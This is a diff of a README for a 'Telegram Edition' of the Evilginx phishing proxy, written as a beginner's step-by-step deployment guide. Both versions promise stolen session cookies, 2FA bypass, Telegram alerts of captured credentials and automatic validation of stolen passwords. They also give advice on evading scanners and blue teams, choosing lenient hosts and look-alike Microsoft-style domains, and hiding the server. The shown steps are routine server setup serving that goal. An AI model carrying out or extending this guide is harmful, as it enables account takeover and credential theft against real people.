@@ -1,512 +1,198 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/afrikaquality/evilginx2/master/media/img/logo.png" alt="Evilginx Logo" width="200">
-</p>
+# Evilginx2 (Telegram Edition by @officialmonsterz) — Complete Deployment Guide
 
-<h1 align="center">📘 EVILGINX3 TELEGRAM EDITION — ULTIMATE DEPLOYMENT GUIDE</h1>
-
-<p align="center">
-  <strong>The only guide you will ever need. From zero to capturing sessions, step by step.</strong>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Read_Time-120_minutes-blue?style=flat-square" alt="Read Time">
-  <img src="https://img.shields.io/badge/Difficulty-Beginner_Friendly-green?style=flat-square" alt="Difficulty">
-  <img src="https://img.shields.io/badge/Last_Updated-July_2026-brightgreen?style=flat-square" alt="Updated">
-  <img src="https://img.shields.io/badge/Tested-Ubuntu_22.04_&_24.04-success?style=flat-square" alt="Tested On">
-  <img src="https://img.shields.io/badge/Cloudflare-Full_Integration-orange?style=flat-square" alt="Cloudflare">
-  <img src="https://img.shields.io/badge/Redirectors-Custom-red?style=flat-square" alt="Redirectors">
-</p>
+**The full, no-stone-unturned guide from zero to fully functional**
 
 ---
 
-## 🎯 WHAT THIS GUIDE DOES
+## WHAT YOU'RE ABOUT TO BUILD
 
-By the end of this guide, you will have a fully operational Evilginx3 Telegram Edition server that:
+This guide will take you from a fresh VPS to a fully operational Evilginx2 server with **every single feature** working:
 
-- ✅ Captures session cookies from 40+ websites (Microsoft, Google, LinkedIn, etc.)
-- ✅ Bypasses 2FA/MFA completely
-- ✅ Sends instant Telegram notifications with credentials
-- ✅ Runs 24/7 with auto-restart on failure
-- ✅ Survives server reboots
-- ✅ Is hardened against common attacks
-- ✅ Can be managed from a beautiful web dashboard
-- ✅ Uses custom redirectors (post-auth HTML pages) to avoid suspicion
-- ✅ Is fully integrated with Cloudflare (DNS, SSL, WAF, Workers, Turnstile, Caching)
-- ✅ Can be operated by a non-technical user (after setup)
-
-**No prior experience required.** Every step is explained as if you've never touched a server before.
-
----
-
-## 📚 TABLE OF CONTENTS
-
-### 🟢 GETTING STARTED (Phases 0–3)
-| Phase | Title | Time | What You'll Do |
-|:------|:------|:-----|:---------------|
-| **0** | [Pre-Deployment Planning](#phase-0--pre-deployment-planning) | 10 min | Choose your VPS, domain, and tools |
-| **1** | [Buy a Domain & Connect to Cloudflare](#phase-1--buy-a-domain--connect-to-cloudflare) | 15 min | Own a domain and route DNS through Cloudflare |
-| **2** | [Connect to Your Server](#phase-2--connect-to-your-server) | 5 min | First SSH login and system update |
-| **3** | [Install Required Tools](#phase-3--install-required-tools) | 10 min | Install Go, Git, firewall, and helpers |
-
-### 🟡 CORE SETUP (Phases 4–6)
-| Phase | Title | Time | What You'll Do |
-|:------|:------|:-----|:---------------|
-| **4** | [Configure DNS in Cloudflare](#phase-4--configure-dns-in-cloudflare) | 5 min | Point your domain to your server |
-| **4B** | [Cloudflare Redirect Rules & Page Rules](#phase-4b--cloudflare-redirect-rules--page-rules) | 10 min | Redirect smart traffic, hide infrastructure |
-| **4C** | [Cloudflare WAF & Security Settings](#phase-4c--cloudflare-waf--security-settings) | 10 min | Lock down your domain from scanners |
-| **4D** | [Cloudflare Workers (Traffic Fronting)](#phase-4d--cloudflare-workers-traffic-fronting) | 15 min | Hide your real server IP completely |
-| **4E** | [Cloudflare Turnstile CAPTCHA Setup](#phase-4e--cloudflare-turnstile-captcha-setup) | 10 min | Add CAPTCHA before phishing page loads |
-| **4F** | [Cloudflare Caching & Performance](#phase-4f--cloudflare-caching--performance) | 5 min | Speed up and protect your setup |
-| **5** | [Build Evilginx from Source](#phase-5--build-evilginx-from-source) | 10 min | Download and compile the program |
-| **6** | [First Run & Initial Configuration](#phase-6--first-run--initial-configuration) | 10 min | Set your domain, IP, and core settings |
-
-### 🔴 ADVANCED SETUP (Phases 7–10)
-| Phase | Title | Time | What You'll Do |
-|:------|:------|:-----|:---------------|
-| **7** | [Wildcard SSL Certificate (Hides Subdomains)](#phase-7--wildcard-ssl-certificate-hides-subdomains) | 15 min | Get a cert that doesn't expose subdomains |
-| **8** | [Telegram Bot Setup](#phase-8--telegram-bot-setup) | 10 min | Create a bot and get phone notifications |
-| **9** | [Create Your First Phishing Campaign](#phase-9--create-your-first-phishing-campaign) | 15 min | Enable a phishlet and generate a URL |
-| **9B** | [Custom Redirectors (Post-Auth HTML Pages)](#phase-9b--custom-redirectors-post-auth-html-pages) | 15 min | Make your phishing pages look more legit |
-| **9C** | [Custom Landing Pages](#phase-9c--custom-landing-pages) | 15 min | Create decoy pages for bots and scanners |
-| **10** | [The Web Dashboard](#phase-10--the-web-dashboard) | 10 min | Control everything from your browser |
-
-### 🟣 PRODUCTION (Phases 11–14)
-| Phase | Title | Time | What You'll Do |
-|:------|:------|:-----|:---------------|
-| **11** | [Auto-Start on Boot (Systemd)](#phase-11--auto-start-on-boot-systemd) | 10 min | Make Evilginx run forever, even after reboot |
-| **12** | [Live Feed (Real-Time Session Stream)](#phase-12--live-feed-real-time-session-stream) | 10 min | Stream sessions to a separate dashboard |
-| **13** | [Auto-Export & Backups](#phase-13--auto-export--backups) | 10 min | Auto-save sessions to JSON/CSV |
-| **14** | [Updating & Maintenance](#phase-14--updating--maintenance) | 10 min | Keep your server up to date |
-
-### 🔵 EXTRAS (Phases 15–21)
-| Phase | Title | Time | What You'll Do |
-|:------|:------|:-----|:---------------|
-| **15** | [GoPhish Integration](#phase-15--gophish-integration) | 20 min | Connect Evilginx to GoPhish for mass emailing |
-| **16** | [Multi-User Dashboard & RBAC](#phase-16--multi-user-dashboard--rbac) | 10 min | Add team members with role-based access |
-| **17** | [Docker Deployment](#phase-17--docker-deployment) | 15 min | Alternative: run as a container |
-| **18** | [Phishlet Customization](#phase-18--phishlet-customization) | 20 min | Create your own phishlets |
-| **19** | [OPSEC Hardening Checklist](#phase-19--opsec-hardening-checklist) | 15 min | Stay hidden from blue teams |
-| **20** | [Troubleshooting Encyclopedia](#phase-20--troubleshooting-encyclopedia) | — | Fix ANY problem |
-| **21** | [Quick Command Reference](#phase-21--quick-command-reference) | — | Cheat sheet for everything |
+| Feature | What It Means In Plain English |
+|---------|-------------------------------|
+| **Reverse Proxy Engine** | Acts as a middleman between the victim and the real website |
+| **Session Cookie Capture** | Steals the "already logged in" ticket — bypasses 2FA completely |
+| **Wildcard SSL Certificate** | One certificate covers `*.yourdomain.com` — stays hidden from Certificate Transparency logs |
+| **Web Dashboard** | A website at port 5000 where you see all captured sessions in a table |
+| **Telegram Alerts** | Your phone buzzes the instant credentials are captured |
+| **GeoIP Tracking** | Shows you country, city, latitude/longitude, ISP, and VPN status of every visitor |
+| **Credential Validation** | Automatically tests if the stolen password actually works on the real website |
+| **VPN/Proxy/DC Blocking** | Block visitors who are using VPNs, proxies, or datacenter IPs |
+| **Country Blocking** | Block entire countries from seeing your phishing page |
+| **Cloudflare Turnstile** | A CAPTCHA challenge before victims see the login page |
+| **CSS Randomization** | Changes tiny pixels every page load — defeats screenshot-based detection |
+| **Privacy Extension Detection** | Detects if the victim has ad-blockers or anti-phishing extensions |
+| **Header Stripping** | Removes Evilginx fingerprints so security scanners can't detect it |
+| **JS Obfuscation** | Hides injected JavaScript so signature-based detection fails |
+| **URL Rewriting** | Cleans the browser address bar so victims don't see suspicious paths |
+| **Dynamic Content Spoofing** | Serves real-looking content to unauthorized visitors instead of a blank page |
+| **Auto-Start on Boot** | If your VPS reboots, Evilginx starts automatically |
+| **Blacklist System** | Blocks repeat visitors and automated scanners |
+| **Live Feed (optional)** | Real-time WebSocket feed of events as they happen |
+| **Auto-Export** | Automatically saves sessions to CSV or JSON |
 
 ---
 
-## PHASE 0 — Pre-Deployment Planning
+## WHAT YOU NEED BEFORE STARTING
 
-**Time: ~10 minutes | What you need: Pen and paper (or notes app)**
+| Item | Example | Where To Get It |
+|------|---------|-----------------|
+| **VPS (Virtual Private Server)** | `95.133.228.19` | Hetzner, DigitalOcean, Vultr, Contabo, Linode — any Ubuntu 22.04 or 24.04 |
+| **Domain Name** | `officialmonsterz.store` | Namecheap, GoDaddy, Porkbun, Cloudflare Registrar |
+| **Cloudflare Account** | Free plan | https://dash.cloudflare.com |
+| **Telegram Account** | @yourusername | https://telegram.org |
+| **SSH Client** | Terminal or PuTTY | Built into Mac/Linux. Windows: https://putty.org or Windows Terminal |
 
-### 🎯 Goal: Make smart decisions BEFORE you start
+**VPS minimum specs:** 1 CPU core, 1 GB RAM, 10 GB SSD, Ubuntu 22.04 or 24.04.
 
----
-
-### 0.1 — Choose Your VPS Provider
-
-You need a VPS (Virtual Private Server) — a computer in a data center that runs 24/7.
-
-Contact Provider
-
-#### Recommended Specifications
-
-For Evilginx to run smoothly, your VPS needs:
-
-- **CPU:** 2 vCPU (2+ recommended if running live feed too)
-- **RAM:** 2 GB minimum, 4 GB recommended
-- **Storage:** 80 GB minimum
-- **Bandwidth:** Unlimited or 1 TB+ per month
-- **IPv4:** Yes (required for Let's Encrypt)
-- **Location:** Pick one close to your targets:
-  - **US targets:** US East/West
-  - **EU targets:** Frankfurt, Amsterdam, London
-  - **Asia targets:** Singapore, Tokyo
-  - **Africa targets:** Frankfurt or London
-- **OS:** Ubuntu 22.04 LTS or 24.04 LTS (most tested)
-
-> **💡 Pro Tip:** Buy at least **2 months upfront** to test thoroughly. You don't want to lose your data when a free trial expires.
-
-#### ⚠️ What to AVOID in a VPS Provider
-
-- ❌ **AWS, Google Cloud, Azure** — They ban phishing tools and have strict ToS
-- ❌ **Providers that require ID verification for crypto payments** — Limits your anonymity
-- ❌ **Free trials** — They get terminated and your data is lost
-- ❌ **Providers with poor reputation (e.g., some "unlimited bandwidth" hosts)** — They throttle or ban
+**Total time:** 45–75 minutes depending on your internet speed.
 
 ---
 
-### 0.2 — Choose Your Domain
+# PART 1: CONNECTING TO YOUR VPS
 
-Your domain is the foundation of everything. Pick carefully.
+## STEP 1 — Open Your Terminal
 
-#### Best Domain Registrars (for this use case)
+First, you need to connect to your VPS. This is called SSH (Secure Shell).
 
-contact provider
+**On Mac or Linux:**
+- Open the "Terminal" app
+- You'll see a window with a blinking cursor
 
-#### Best TLDs (Top-Level Domains)
+**On Windows:**
+- Open "Command Prompt" or "PowerShell" or install "Windows Terminal"
 
-| TLD | Cost | Detection Risk | Why |
-|:----|:-----|:---------------|:----|
-| `.xyz` | $1-2 | Low | Cheap, common, no specific association |
-| `.online` | $2-5 | Low | Looks like a SaaS business |
-| `.site` | $3-10 | Low | Generic |
-| `.store` | $3-15 | Low-Medium | Used for legit e-commerce |
-| `.tech` | $5-15 | Low | Tech company feel |
-| `.cloud` | $3-10 | Low | Generic cloud service feel |
-| `.app` | $15-20 | Medium | Requires HTTPS (good, but more scrutiny) |
-| `.live` | $3-8 | Low | Streaming/online service feel |
+## STEP 2 — SSH Into Your VPS
 
-#### ❌ AVOID These TLDs
-
-- `.com`, `.net`, `.org` — Heavily monitored, frequently on blocklists
-- `.gov`, `.edu`, `.mil` — Restricted, suspicious
-- Country codes (`.ru`, `.cn`, etc.) — Geopolitical scrutiny
-
-#### Domain Naming Tips
-
-**Good names (look like real businesses):**
-- `secure-portal-verify.com`
-- `auth-services-portal.online`
-- `cloud-identity-check.site`
-- `office365-portal-access.live`
-- `m365-authentication-center.xyz`
-
-**Bad names (obvious phishing):**
-- `login-microsoft.com` — Tells everyone what it's for
-- `microsoft-365-login.net` — Too on-the-nose
-- `free-money-fast.xyz` — Obvious scam
-
-> **💡 Pro Tip:** Use a "double-meaning" name. Something that could be a real company but isn't tied to a specific brand.
-
----
-
-### 0.3 — Required Tools Checklist
-
-Before you start, make sure you have:
-
-- [ ] **A computer** (Windows, Mac, or Linux) with internet access
-- [ ] **A web browser** (Chrome, Firefox, Edge — all work)
-- [ ] **A text editor** (Notepad, VS Code, anything)
-- [ ] **A terminal/SSH client:**
-  - Windows 10/11: Built-in (PowerShell or Command Prompt)
-  - Mac: Built-in (Terminal)
-  - Linux: Built-in
-- [ ] **An email address** (for Cloudflare and Let's Encrypt)
-- [ ] **A Telegram account** (free, takes 1 minute to create)
-- [ ] **A smartphone** (to receive Telegram notifications)
-- [ ] **A credit card OR cryptocurrency** (to buy VPS and domain)
-
-
----
-
-### 0.4 — Important Notes Before You Start
-
-1. **Bookmark this page** — You'll be switching between this guide and your terminal frequently.
-2. **Don't close your SSH session** mid-setup — You'll lose your place.
-3. **Keep a notepad open** — Write down passwords, tokens, and IPs as you go.
-4. **Work sequentially** — Don't skip phases. Each builds on the previous.
-5. **Save EVERYTHING** — Take screenshots of success messages.
-
----
-
-## PHASE 1 — Buy a Domain & Connect to Cloudflare
-
-**Time: ~15 minutes | Where: Web browser**
-
-### 🎯 Goal: Own a domain and route its DNS through Cloudflare (for free SSL, fast DNS, and hiding your server IP)
-
----
-
-### 1.1 — Buy Your Domain
-
-**Pick a registrar from the list above and buy your chosen domain.**
-
-For this guide, I'll use the example domain:
-```
-YOUR_DOMAIN = offices65.online
-YOUR_SERVER_IP = (you'll get this after buying VPS)
-```
-
-> **📝 Write down YOUR_DOMAIN — you'll need it many times.**
-
----
-
-### 1.2 — Create a Cloudflare Account
-
-1. Open your browser and go to **[dash.cloudflare.com/sign-up](https://dash.cloudflare.com/sign-up)**
-2. Enter your **email address**
-3. Create a **password** (use a unique one — save it in your password manager)
-4. Click **"Create Account"**
-5. Check your email inbox — Cloudflare sent a **verification email**
-6. Click the **verification link** in the email
-7. ✅ Your account is created and on the **Free plan** (no credit card needed)
-
----
-
-### 1.3 — Add Your Domain to Cloudflare
-
-1. After logging in, you'll see the Cloudflare dashboard
-2. Click the big blue **"+ Add a Site"** button (or **"Add site"**)
-3. Type your domain name in the box:
-   ```
-   offices65.online
-   ```
-4. Click **"Add site"**
-5. Cloudflare asks you to **select a plan** — choose **"Free"** ($0/month)
-6. Click **"Continue"**
-
-#### Cloudflare's Quick Scan
-
-Cloudflare will now scan for existing DNS records. Since you just bought the domain, there won't be any. Click **"Continue"** to proceed.
-
----
-
-### 1.4 — Get Your Cloudflare Nameservers
-
-After the scan, Cloudflare shows you **two nameservers**. They look like:
-
-```
-arya.ns.cloudflare.com
-matt.ns.cloudflare.com
-```
-
-(Your actual nameservers will be different — they're assigned to your account.)
-
-> **📝 COPY BOTH NAMESERVERS to your notepad. You need them in the next step.**
-
-> **⚠️ Do NOT click "Done" yet** — you need to change your domain's nameservers first.
-
----
-
-### 1.5 — Change Nameservers at Your Domain Registrar
-
-Now go back to where you **bought the domain** (PorkBun, Namecheap, etc.).
-
-The exact steps vary by registrar, but generally:
-
-#### For PorkBun:
-1. Log in to PorkBun
-2. Click **"Details"** next to your domain
-3. Scroll to **"Nameservers"** section
-4. Select **"Custom"** nameservers
-5. Delete the existing nameservers
-6. Paste your two Cloudflare nameservers:
-   ```
-   arya.ns.cloudflare.com
-   matt.ns.cloudflare.com
-   ```
-7. Click **"Save"**
-
-#### For Namecheap:
-1. Log in to Namecheap
-2. Click **"Domain List"** → click your domain
-3. Find **"Nameservers"** section
-4. Select **"Custom DNS"** from the dropdown
-5. Paste your two Cloudflare nameservers
-6. Click the **green checkmark** to save
-
-#### For Other Registrars:
-- Look for **"DNS Settings"**, **"Nameservers"**, or **"Manage DNS"**
-- Change from "default nameservers" to "custom nameservers"
-- Paste the two Cloudflare nameservers
-
-> **⏱️ Wait time:** Changes take 5-15 minutes to propagate. You can proceed to Phase 2 while waiting.
-
----
-
-### 1.6 — Verify Cloudflare is Active
-
-#### Method 1: Check Cloudflare Dashboard
-1. Go back to your Cloudflare dashboard
-2. After 5-10 minutes, Cloudflare will show **"Active"** next to your domain
-3. ✅ You're done with this step
-
-#### Method 2: DNS Lookup (from your computer)
-On your computer (not the VPS yet), open a terminal:
+Type this command exactly, replacing `95.133.228.19` with YOUR actual VPS IP address:
 
 ```bash
-# Windows (PowerShell), Mac, Linux:
-nslookup -type=NS offices65.online 1.1.1.1
+ssh root@95.133.228.19
 ```
 
-**Expected output:**
+Then press **Enter**.
+
+**What this does:** It opens a secure connection to your server.
+
+**What you'll see:**
 ```
-Server:		1.1.1.1
-Address:	1.1.1.1#53
-
-Non-authoritative answer:
-offices65.online	nameserver = arya.ns.cloudflare.com
-offices65.online	nameserver = matt.ns.cloudflare.com
+The authenticity of host '95.133.228.19 (95.133.228.19)' can't be established.
+ED25519 key fingerprint is SHA256:...
+Are you sure you want to continue connecting? (yes/no/[fingerprint])
 ```
 
-> **If you still see your registrar's nameservers:** Wait 5-10 more minutes and try again. DNS propagation is not instant.
+Type `yes` and press **Enter**.
 
-✅ **Cloudflare is set up. Move to Phase 2.**
+Then it asks for your password. **Type your VPS root password** and press **Enter**.
+
+⚠️ **Important:** When you type the password, you won't see any characters on screen (no dots, no asterisks). This is normal. Just type and press Enter.
+
+**What you'll see if successful:**
+```
+Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-rc7 x86_64)
+
+root@yourvps:~#
+```
+
+The `root@yourvps:~#` prompt means you're now inside your VPS.
+
+### TROUBLESHOOTING SSH
+
+| Problem | What's Happening | How To Fix |
+|---------|------------------|------------|
+| `Connection refused` | SSH service not running or wrong port | Go to your VPS provider's panel → reinstall with Ubuntu → try again |
+| `Permission denied` | Wrong password | Go to VPS provider panel → reset root password → try again |
+| `Connection timed out` | VPS IP is wrong or server is off | Check the IP in your VPS provider's dashboard |
+| `Host key changed` | You've connected to this IP before with a different server | Run this first: `ssh-keygen -R 95.133.228.19` then try again |
 
 ---
 
-## PHASE 2 — Connect to Your Server
+# PART 2: SYSTEM PREPARATION
 
-**Time: ~5 minutes | Where: Your computer's terminal**
+## STEP 3 — Update Your System
 
-### 🎯 Goal: Remotely log into your VPS for the first time
+Think of this like updating apps on your phone — it fixes security issues and gets everything ready.
 
----
-
-### 2.1 — Get Your Server's IP Address
-
-After buying your VPS, the provider sent you a **welcome email** with:
-- **IP address** (e.g., `95.133.228.114`)
-- **Username** (usually `root`)
-- **Password** (a random string)
-
-> **📝 Write down YOUR_SERVER_IP, USERNAME, and PASSWORD.**
-
-If you can't find this email, log in to your VPS provider's dashboard — they show the IP there.
-
----
-
-### 2.2 — Open a Terminal
-
-- **Windows 10/11:** Press `Win + R`, type `powershell`, press Enter
-- **Mac:** Press `Cmd + Space`, type `terminal`, press Enter
-- **Linux:** Press `Ctrl + Alt + T`
-
----
-
-### 2.3 — SSH Into Your Server
-
-In the terminal, type:
-
-```bash
-ssh root@YOUR_SERVER_IP
-```
-
-**Replace `YOUR_SERVER_IP` with your actual IP** (e.g., `ssh root@95.133.228.114`).
-
-Press **Enter**.
-
-#### The First Time You Connect
-
-You'll see this scary-looking message:
-
-```
-The authenticity of host '95.133.228.114 (95.133.228.114)' can't be established.
-ED25519 key fingerprint is SHA256:aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890abcdef.
-Are you sure you want to continue connecting (yes/no/[fingerprint])?
-```
-
-This is NORMAL. Type `yes` and press **Enter**.
-
-Next, you'll be prompted for your password:
-
-```
-root@95.133.228.114's password:
-```
-
-**Type your password carefully** (you won't see the characters as you type — that's a security feature). Press **Enter**.
-
-> **💡 Pro Tip:** Copy the password from your welcome email, then right-click in the terminal to paste it. Avoid typing it manually — typos are common.
-
-#### Success!
-
-If everything worked, you'll see:
-
-```
-Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-185-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
-Last login: Sun Jul 12 23:48:04 2026 from 102.91.4.79
-root@bulletproofedvps:~#
-```
-
-That `root@bulletproofedvps:~#` is your **command prompt**. You're now logged in!
-
-> **If you get "Permission denied":**
-> - Make sure you're using the correct username (try `ubuntu` or `admin` if `root` doesn't work)
-> - Make sure you're using the correct password (case-sensitive!)
-> - If you set up an SSH key, use: `ssh -i ~/path/to/key.pem root@YOUR_SERVER_IP`
-
----
-
-### 2.4 — Update the System
-
-Before installing anything, update Ubuntu's package list and install security updates:
+Run this command:
 
 ```bash
 apt update && apt upgrade -y
 ```
 
-**What this does:**
-- `apt update` — Downloads the latest list of available software
-- `apt upgrade -y` — Installs all available updates (the `-y` says "yes to all questions")
-
-**Expected output:** Lots of text scrolling by. Some packages will be downloaded, some will be installed, some will be "already up to date."
-
-**Expected duration:** 30-90 seconds, depending on your server's speed.
-
-> **⚠️ If you see a pink/blue screen asking about configuration files:**
-> - It usually asks "What do you want to do about modified configuration file?"
-> - The default is `keep the local version currently installed`
-> - Just press **Enter** to accept the default
-
-When the command finishes, you'll see your prompt again:
+**What you'll see:** Lots of text scrolling. Package lists being downloaded. It ends with:
 ```
-root@bulletproofedvps:~# 
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+Calculating upgrade... Done
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
 ```
 
-✅ **Server is updated. Move to Phase 3.**
+**What it does:**
+- `apt update` — checks for new versions of everything
+- `apt upgrade -y` — downloads and installs them (the `-y` means "yes, I agree")
 
----
+**Takes:** 1–5 minutes depending on your VPS's internet speed.
 
-## PHASE 3 — Install Required Tools
+### TROUBLESHOOTING UPDATE
 
-**Time: ~10 minutes | Where: Your server terminal (still connected from Phase 2)**
+| Problem | What's Happening | How To Fix |
+|---------|------------------|------------|
+| `Could not get lock /var/lib/dpkg/lock-frontend` | Another update is already running | Wait 2 minutes, then try again. Or reboot: `reboot` |
+| `Waiting for cache lock: Could not get lock` | Same as above | Run: `killall apt apt-get` then try again |
+| `Failed to fetch` | Internet issue on VPS | Try again: `apt update` |
 
-### 🎯 Goal: Install every tool Evilginx needs to run
+## STEP 4 — Install Required Programs
 
----
+Now we install all the tools we'll need. Each one is like installing an app on your phone.
 
-### 3.1 — Install System Tools
-
-Copy and paste this entire command, then press **Enter**:
+Run this single command:
 
 ```bash
-apt install -y wget curl git make build-essential screen fail2ban htop net-tools ufw certbot nano dnsutils jq unzip
+apt install -y curl wget git make build-essential screen fail2ban htop net-tools ufw certbot nano tar unzip dnsutils
 ```
 
-**What each tool does:**
+**What each tool does (in plain English):**
+| Tool | What It Does |
+|------|--------------|
+| `curl` | Downloads things from the internet (like a web browser in the terminal) |
+| `wget` | Also downloads things from the internet |
+| `git` | Downloads code from GitHub |
+| `make` | Helps compile programs |
+| `build-essential` | Has tools needed to turn code into a working program |
+| `screen` | Lets you leave a program running even after you close your terminal |
+| `fail2ban` | Security — blocks hackers who try to guess your password |
+| `htop` | Shows you what programs are running and using CPU/memory |
+| `net-tools` | Network utilities like `ifconfig` |
+| `ufw` | Firewall — blocks unwanted internet traffic |
+| `certbot` | Gets free SSL certificates from Let's Encrypt |
+| `nano` | A simple text editor in the terminal |
+| `tar` | Extracts compressed files |
+| `unzip` | Extracts zip files |
+| `dnsutils` | DNS tools like `dig` for checking DNS records |
 
-| Tool | Why You Need It |
-|:-----|:----------------|
-| `wget` | Download Go and other files from the internet |
-| `curl` | Test Telegram API, send HTTP requests |
-| `git` | Download the Evilginx source code from GitHub |
-| `make` / `build-essential` | Compile Go programs (compilers, linkers) |
-| `screen` | Keep programs running even when you disconnect SSH |
-| `fail2ban` | Automatically blocks hackers trying to brute-force SSH |
-| `htop` | Monitor CPU, RAM, and running processes |
-| `net-tools` | Network diagnostics (`ifconfig`, `netstat`) |
-| `ufw` | "Uncomplicated Firewall" — controls which ports are open |
-| `certbot` | Get free SSL certificates from Let's Encrypt |
-| `nano` | Simple text editor for editing config files |
-| `dnsutils` | `dig` and `nslookup` commands for DNS testing |
-| `jq` | Parse and pretty-print JSON (for testing APIs) |
-| `unzip` | Extract ZIP files (some phishlets are packaged as ZIPs) |
+**What you'll see:** Each package installs one by one. Final line will show something like:
+```
+Processing triggers for man-db (2.10.2-1) ...
+```
 
-**Expected output:** Lots of "Setting up..." and "Processing..." messages.
+**Takes:** 30–60 seconds.
 
-**Expected duration:** 1-2 minutes.
+## STEP 5 — Configure the Firewall (UFW)
 
-When complete, you'll see your prompt again.
+The firewall is like a bouncer at a club — it only lets specific types of traffic in.
 
----
+We need to open exactly these doors (ports):
 
-### 3.2 — Configure the Firewall (UFW)
+| Port | Protocol | What Uses It |
+|------|----------|--------------|
+| 22 | TCP | SSH (you connecting to the VPS) |
+| 53 | UDP | DNS (Evilginx's built-in DNS server) |
+| 80 | TCP | HTTP (redirects visitors to HTTPS) |
+| 443 | TCP | HTTPS (the phishing pages) |
+| 5000 | TCP | Web Dashboard (the browser interface) |
 
-A firewall blocks unwanted traffic. We'll allow only the ports Evilginx needs.
-
-Run each of these commands one at a time:
+Run these commands one at a time:
 
 ```bash
 ufw allow 22/tcp
@@ -514,2643 +200,1682 @@ ufw allow 53/udp
 ufw allow 80/tcp
 ufw allow 443/tcp
 ufw allow 5000/tcp
-ufw allow 1337/tcp
-ufw --force enable
 ```
 
-**Why each port:**
+**What each command says:** "Bouncer, let this type of traffic through."
 
-| Port | Protocol | Purpose |
-|:-----|:---------|:--------|
-| `22` | TCP | SSH — so you don't lock yourself out of the server |
-| `53` | UDP | DNS — victims' browsers use this to find your domain |
-| `80` | TCP | HTTP — for Let's Encrypt SSL verification |
-| `443` | TCP | HTTPS — the phishing pages are served on this port |
-| `5000` | TCP | Dashboard — your web admin panel |
-| `1337` | TCP | Live Feed — real-time session stream |
-
-**Expected output:**
-- Each `ufw allow` command: `Rule added`
-- `ufw --force enable` command: `Firewall is active and enabled on system startup`
-
----
-
-### 3.3 — Verify the Firewall
+Now turn the firewall ON and check it:
 
 ```bash
-ufw status
+ufw --force enable
+ufw status numbered
 ```
 
-**Expected output:**
+**What you'll see:**
 ```
 Status: active
 
-To                         Action      From
+     To                         Action      From
 --                         ------      ----
 22/tcp                     ALLOW       Anywhere
 53/udp                     ALLOW       Anywhere
 80/tcp                     ALLOW       Anywhere
 443/tcp                    ALLOW       Anywhere
 5000/tcp                   ALLOW       Anywhere
-1337/tcp                   ALLOW       Anywhere
 ```
 
-✅ If you see all 6 ports listed as `ALLOW`, your firewall is configured.
+✅ **All 5 ports must show "ALLOW" and "Anywhere"**
 
-> **⚠️ IMPORTANT:** If you ever change your dashboard port or live feed port, you must add the new port to UFW too.
+**What `ufw --force enable` does:** Turns the firewall on without asking "are you sure?".
+
+### TROUBLESHOOTING FIREWALL
+
+| Problem | How To Fix |
+|---------|------------|
+| `ufw: command not found` | Re-run Step 4 (packages didn't install) |
+| A port is missing | Run `ufw allow <port>/<protocol>` |
+| Need to delete a wrong rule | `ufw status numbered` → `ufw delete <NUMBER>` |
+| Can't SSH after enabling | This shouldn't happen since we allowed 22 first, but your VPS provider might have its own firewall too — check their control panel |
 
 ---
 
-### 3.4 — Free Port 53 (CRITICAL — DO NOT SKIP)
+# PART 3: FREE UP PORT 53 (DNS)
 
-Ubuntu runs a DNS service called `systemd-resolved` that uses port 53. Evilginx **also** needs port 53 for its built-in DNS server. **They will conflict and Evilginx will fail to start.**
+## STEP 6 — Kill Ubuntu's DNS Resolver
 
-Copy and paste this ENTIRE block (all 6 commands at once):
+Port 53 is the door that DNS uses. Ubuntu has a built-in DNS service called `systemd-resolved` that sits on this door. Evilginx needs this door for its own DNS server. Think of it as someone sitting in your parking spot — you need to move them.
+
+Run these commands **one at a time**:
 
 ```bash
+# Step 6a: Stop the built-in DNS resolver
 systemctl stop systemd-resolved
+```
+
+✅ **What you'll see:** Nothing. Just returns to the prompt.
+
+```bash
+# Step 6b: Prevent it from starting on boot
 systemctl disable systemd-resolved
+```
+
+✅ **What you'll see:**
+```
+Removed /etc/systemd/system/sysinit.target.wants/systemd-resolved.service.
+```
+
+```bash
+# Step 6c: Remove the old DNS config file
 rm -f /etc/resolv.conf
+```
+
+✅ **What you'll see:** Nothing.
+
+```bash
+# Step 6d: Set Cloudflare's DNS as our new DNS server
 echo "nameserver 1.1.1.1" | tee /etc/resolv.conf
+```
+
+✅ **What you'll see:**
+```
+nameserver 1.1.1.1
+```
+
+```bash
+# Step 6e: Add a backup DNS server
 echo "nameserver 1.0.0.1" | tee -a /etc/resolv.conf
+```
+
+✅ **What you'll see:**
+```
+nameserver 1.0.0.1
+```
+
+```bash
+# Step 6f: Lock the file so nothing overwrites it
 chattr +i /etc/resolv.conf
 ```
 
-**What each command does:**
+✅ **What you'll see:** Nothing.
 
-| Command | Purpose |
-|:--------|:--------|
-| `systemctl stop systemd-resolved` | Stops the service immediately |
-| `systemctl disable systemd-resolved` | Prevents it from starting after reboot |
-| `rm -f /etc/resolv.conf` | Deletes the old DNS config file |
-| `echo "nameserver 1.1.1.1" > /etc/resolv.conf` | Sets Cloudflare as primary DNS |
-| `echo "nameserver 1.0.0.1" >> /etc/resolv.conf` | Adds Cloudflare as backup DNS |
-| `chattr +i /etc/resolv.conf` | Locks the file so nothing overwrites it |
+### What You Just Did (Plain English):
 
-**Expected output:** No errors. Just the prompt coming back.
+| Command | What It Actually Did |
+|---------|---------------------|
+| `systemctl stop` | Told Ubuntu's DNS service to go to sleep |
+| `systemctl disable` | Told Ubuntu's DNS service "don't wake up on boot" |
+| `rm -f /etc/resolv.conf` | Deleted the old "phone book" that tells your VPS how to find websites |
+| `echo ... > /etc/resolv.conf` | Wrote Cloudflare's DNS (1.1.1.1) as the new "phone book" |
+| `chattr +i` | Locked the file so nothing can change it (like putting a padlock on it) |
+
+## STEP 7 — Test DNS Is Working
+
+Now check that your VPS can still look up websites:
+
+```bash
+dig @1.1.1.1 google.com +short
+```
+
+✅ **What you'll see:** An IP address like:
+```
+142.250.80.46
+```
+
+**If you see nothing (blank line):** Wait 5 seconds and try again.
+
+**If you see `dig: command not found`:** Run `apt install dnsutils -y` first.
+
+## STEP 8 — Reboot for Clean State
+
+This gives your VPS a fresh start with port 53 free:
+
+```bash
+reboot
